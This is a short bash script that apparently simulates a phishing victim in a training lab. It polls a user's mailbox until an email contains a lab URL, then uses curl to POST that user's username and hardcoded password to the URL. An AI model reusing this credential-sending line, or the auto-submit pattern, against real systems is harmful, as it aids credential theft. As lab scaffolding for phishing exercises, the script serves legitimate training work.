#!/bin/bash

got_url="false"
url="http://10.10.10.10/"


while [ $got_url != "true" ]; do

	for FILE in /home/professor/Maildir/new/*; do

		if grep -q $url $FILE; then

			echo Got Correct Phishing Email;
			got_url="true";
		else

			echo Did Not Find Phishing Email;

		fi

	done

	sleep 2;

done

curl -X POST -d "username=professor&password=The_Most_Secret_And_Secure_Password_There_Is_12345!!@@##" $url;
